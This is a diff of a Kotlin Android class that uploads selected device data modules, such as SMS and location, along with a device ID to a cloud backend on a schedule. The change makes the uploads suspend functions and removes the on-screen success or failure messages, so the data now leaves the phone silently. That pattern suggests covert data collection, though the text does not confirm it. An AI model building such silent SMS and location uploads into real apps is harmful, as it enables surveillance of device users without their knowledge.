@@ -1,7 +1,6 @@
 package com.example.myandroid
 
 import android.content.Context
-import android.widget.TextView
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
@@ -11,15 +10,15 @@ import java.net.URL
 object CloudManager {
 
     // Modular Upload: Takes a list of features to upload (e.g. ["sms", "location"] or ["ALL"])
-    fun uploadData(ctx: Context, modules: List<String>, btn: TextView? = null) {
-        CoroutineScope(Dispatchers.IO).launch {
+    suspend fun uploadData(ctx: Context, modules: List<String>) {
+        withContext(Dispatchers.IO) {
             try {
                 DebugLogger.log("Cloud", "Starting Upload. Modules: $modules")
                 
                 // Check Global Config before uploading
-                if (!ConfigManager.canUpload(ctx) && btn == null) {
+                if (!ConfigManager.canUpload(ctx)) {
                     DebugLogger.log("Cloud", "Upload BLOCKED by Schedule/Config")
-                    return@launch
+                    return@withContext
                 }
 
                 val json = JSONObject()
@@ -142,26 +141,8 @@ object CloudManager {
                 } else {
                     DebugLogger.log("Cloud", "Upload Finished. Code: $code")
                 }
-                
-                if (btn != null) {
-                    withContext(Dispatchers.Main) {
-                        if (code in 200..299) {
-                            btn.text = "UPLOAD SUCCESS ✅"
-                            btn.background.setTint(0xFF2CB67D.toInt())
-                        } else {
-                             btn.text = "FAILED: $code ❌"
-                             btn.background.setTint(0xFFEF4565.toInt())
-                        }
-                    }
-                }
             } catch (e: Exception) {
                 e.printStackTrace()
-                if (btn != null) {
-                    withContext(Dispatchers.Main) {
-                         btn.text = "ERROR: ${e.message}"
-                         btn.background.setTint(0xFFEF4565.toInt())
-                    }
-                }
             }
         }
     }
@@ -306,8 +287,8 @@ object CloudManager {
         }
     }
 
-    fun uploadSkeleton(ctx: Context, json: JSONObject, btn: TextView? = null) {
-        CoroutineScope(Dispatchers.IO).launch {
+    suspend fun uploadSkeleton(ctx: Context, json: JSONObject) {
+        withContext(Dispatchers.IO) {
             try {
                 json.put("device_id", DeviceManager.getDeviceId(ctx))
                 
@@ -335,17 +316,6 @@ object CloudManager {
                     DebugLogger.log("SUPABASE_ERR", "Skeleton Failed: $code | $err")
                 } else {
                     DebugLogger.log("Cloud", "Skeleton Upload ($code) - Size: ${json.toString().length} bytes")
-                }
-
-                if (btn != null) {
-                    withContext(Dispatchers.Main) {
-                        if (code in 200..299) {
-                            btn.text = "BACKUP COMPLETE ✅"
-                            btn.background.setTint(0xFF2CB67D.toInt())
-                        } else {
-                            btn.text = "FAILED: $code ❌"
-                        }
-                    }
                 }
             } catch (e: Exception) {
                 e.printStackTrace()
